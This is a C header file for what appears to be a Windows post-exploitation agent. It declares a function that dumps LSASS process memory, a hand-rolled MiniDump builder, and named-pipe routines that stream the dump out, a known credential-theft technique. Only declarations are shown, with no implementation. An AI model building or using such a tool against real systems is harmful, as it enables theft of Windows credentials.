#ifndef AGENT_H
#define AGENT_H

#include <windows.h>
#include <winternl.h>

// MiniDump format constants
#define MDMP_SIGNATURE 0x504D444D
#define MDMP_VERSION   0xA793

// Stream types
#define STREAM_SYSTEM_INFO   7
#define STREAM_MODULE_LIST   4
#define STREAM_MEMORY64_LIST 9

// Memory information class
#define MemoryBasicInformation 0

// Pipe communication
HANDLE open_named_pipe(const wchar_t *pipe_name);
BOOL write_pipe(HANDLE pipe, const void *data, DWORD size);
void close_pipe(HANDLE pipe);

// LSASS dump
BOOL dump_lsass(DWORD pid, HANDLE pipe);

// MiniDump builder
typedef struct _MDMP_BUILDER {
    HANDLE process;
    DWORD pid;
    HANDLE pipe;
    DWORD stream_count;
} MDMP_BUILDER;

BOOL mdmp_build_and_stream(MDMP_BUILDER *builder);

#endif // AGENT_H
